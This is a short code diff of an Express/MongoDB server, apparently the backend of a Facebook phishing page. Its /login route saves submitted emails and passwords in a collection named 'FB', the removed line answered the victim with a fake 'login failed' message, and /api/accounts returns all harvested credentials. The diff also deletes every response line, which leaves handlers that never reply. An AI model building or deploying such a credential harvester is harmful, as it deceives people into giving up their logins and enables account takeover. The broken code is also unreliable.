@@ -48,33 +48,21 @@ const FB = mongoose.model('FB', fbSchema);
 // Route để xử lý dữ liệu từ form
 app.post('/login', async (req, res) => {
     try {
-        // Lấy dữ liệu từ form
         const { email, password } = req.body;
-
-        // Tạo một document mới
         const newFB = new FB({ email, password });
-
-        // Lưu document vào MongoDB
         await newFB.save();
-
-        res.status(201).json({ message: "Đăng Nhập Thất Bại!" });
     } catch (error) {
         console.error(error);
-        res.status(500).send('An error occurred while saving the FB account.');
     }
 });
-// Route để lấy dữ liệu từ MongoDB và hiển thị lên trang web
-// API Lấy Dữ Liệu từ MongoDB
+
 app.get("/api/accounts", async (req, res) => {
     try {
         const accounts = await FB.find({});
-        res.json(accounts);
     } catch (error) {
         console.error(error);
-        res.status(500).json({ message: "Lỗi khi lấy dữ liệu" });
     }
 });
-
 
 
 app.listen(port, () => {
